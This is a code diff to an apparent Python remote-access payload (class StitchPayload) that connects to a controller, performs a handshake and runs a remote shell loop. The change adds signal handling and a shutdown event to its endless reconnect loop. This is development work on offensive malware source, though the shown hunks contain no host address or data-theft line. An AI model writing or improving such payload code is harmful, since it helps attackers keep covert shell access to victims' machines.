@@ -8,6 +8,7 @@ import socket
 import struct
 import base64
 import time
+import signal
 import subprocess
 import sys
 import os
@@ -147,14 +148,23 @@ class StitchPayload:
         print("[-] Disconnected")
         
     def run(self):
-        """Main execution"""
-    # TODO: Review - infinite loop may need exit condition
-        while True:
+        """Main execution with graceful shutdown"""
+        shutdown_event = threading.Event()
+        
+        def signal_handler(signum, frame):
+            print(f"\n[!] Received signal {signum}. Shutting down...")
+            shutdown_event.set()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        while not shutdown_event.is_set():
             if self.connect_and_handshake():
                 self.shell_loop()
             else:
                 print("[*] Retrying in 5 seconds...")
-                time.sleep(5)
+                if shutdown_event.wait(5):  # Sleep with interrupt capability
+                    break
 
 if __name__ == "__main__":
     # Get config from environment or use defaults
